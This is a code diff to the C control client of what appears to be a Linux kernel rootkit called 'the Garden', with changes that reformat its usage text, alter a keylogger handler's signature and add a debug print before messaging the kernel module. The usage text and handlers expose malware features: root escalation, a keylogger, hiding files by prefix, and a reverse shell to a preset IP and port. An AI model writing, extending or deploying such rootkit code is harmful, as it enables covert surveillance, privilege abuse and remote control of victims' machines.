@@ -72,13 +72,13 @@ void print_banner() {
 }
 
 void print_usage() {
-	printf("Welcome to the Garden.\n--------------\n");
-	printf("/garden root\t\t\t\t\t\t - gives you root.\n");
-	printf("/garden keylogger [enable/disable]\t - toggles the keylogger.\n");
-	printf("/garden hide add PREFIX\t\t\t\t - adds PREFIX to the hide list.\n");
-	printf("/garden hide rm PREFIX\t\t\t\t - removes PREFIX from the hide list.\n");
-	printf("/garden hide ls\t\t\t\t\t\t - shows prefixes in the hide list.\n");
-	printf("/garden rev_tcp\t\t\t\t\t\t - opens a reverse shell using the IP and PORT configured during setup.\n");
+	printf("\nWelcome to the Garden.\n--------------\n");
+	printf("\t/garden root\t\t\t\t - gives you root.\n");
+	printf("\t/garden keylogger [enable/disable]\t - toggles the keylogger.\n");
+	printf("\t/garden hide add PREFIX\t\t\t - adds PREFIX to the hide list.\n");
+	printf("\t/garden hide rm PREFIX\t\t\t - removes PREFIX from the hide list.\n");
+	printf("\t/garden hide ls\t\t\t\t - shows prefixes in the hide list.\n");
+	printf("\t/garden rev_tcp\t\t\t\t - opens a reverse shell using the IP and PORT configured during setup.\n");
 	exit(0);
 }
 
@@ -126,7 +126,7 @@ void handle_reverse_tcp_shell(char *base_cmd, action_task *action) {
  * 	$ keylogger enable
  * 	$ keylogger disable
  */
-bool handle_keylogger_action(char *base_cmd, char *subarg, action_task *action) {
+void handle_keylogger_action(char *base_cmd, char *subarg, action_task *action) {
 	if (! strcmp(base_cmd, KEYLOGGER)) {
 		if (! strcmp(subarg, ENABLE)) { // Keylogger enable
 			action->func_code = f_code.keylogger_enable;
@@ -165,6 +165,7 @@ void handle_file_hide_action(char *base_cmd, char *subarg, char *argv[], action_
  */
 bool execute_action_if_possible(action_task *action) {
 	if (action->func_code != - 1) {
+		printf("Function code: %d, str: %s\n", action->func_code, action->file_hide_str);
 		communicate_with_lkm(action);
 		return true;
 	} else {
